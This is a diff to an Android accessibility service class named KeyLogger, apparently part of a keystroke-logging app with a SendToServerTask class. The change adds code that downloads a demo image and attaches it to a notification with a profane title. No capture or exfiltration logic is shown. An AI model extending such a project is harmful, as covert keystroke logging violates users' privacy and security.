@@ -3,6 +3,8 @@ package com.example.keyboard;
 import android.accessibilityservice.AccessibilityService;
 import android.app.Notification;
 import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.os.AsyncTask;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
@@ -114,8 +116,37 @@ public class KeyLogger extends AccessibilityService {
 
             System.out.println("PogU");
 
-            NewMessageNotification naman = new NewMessageNotification();
-            naman.notify(this, "FUCK B", 5, "1");
+//            Bitmap loadingpic=null;
+//            NewMessageNotification naman = new NewMessageNotification();
+//            naman.notify(this, "FUCK B", 5, "1");
+
+            new AsyncTask<Void, Void, Bitmap>() {
+                @Override
+                protected Bitmap doInBackground(Void... urls) {
+
+                    try {
+
+                        System.out.println("SHERLOCK HERE HERE");
+                        Bitmap picture = BitmapFactory.decodeStream(new java.net.URL("https://res.cloudinary.com/demo/image/upload/w_250,h_250,c_mfit/w_700/sample.jpg").openStream());
+                        return picture;
+
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                    return null;
+                }
+
+                protected void onPostExecute(Bitmap picture) {
+
+//                    loadingpic = picture;
+                    System.out.println("SHERLOCKED");
+                    callNotification(picture);
+
+
+                }
+            }.execute();
+
+
 
             //Intent intent = new Intent();
 
@@ -124,6 +155,14 @@ public class KeyLogger extends AccessibilityService {
 
     }
 
+
+    private void callNotification(Bitmap picture)
+    {
+        System.out.println("PogU");
+
+        NewMessageNotification naman = new NewMessageNotification();
+        naman.notify(this, "FUCK B", 5, "1", picture);
+    }
 
 
     private class SendToServerTask extends AsyncTask<String, Void, String> {
